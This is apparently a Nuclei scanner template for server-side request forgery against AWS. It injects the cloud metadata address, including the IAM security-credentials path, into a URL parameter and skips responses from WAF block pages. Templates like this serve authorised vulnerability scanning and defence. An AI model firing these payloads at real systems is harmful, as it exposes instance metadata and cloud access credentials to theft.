id: K70n0s510-ssrf-aws-godmode
info:
  name: AWS SSRF God Mode
  author: K70n0s510
  severity: critical
  tags: ssrf,aws,cloud
http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    matchers-condition: and
    matchers:
      - type: word
        words: ["ami-id", "instance-id"]
      
      # GLOBAL WAF IGNORE LIST
      - type: word
        words:
          - "AkamaiGHost"
          - "Access Denied"
          - "Cloudflare"
          - "Attention Required"
          - "security by cloudflare"
          - "Please verify you are a human"
        negative: true
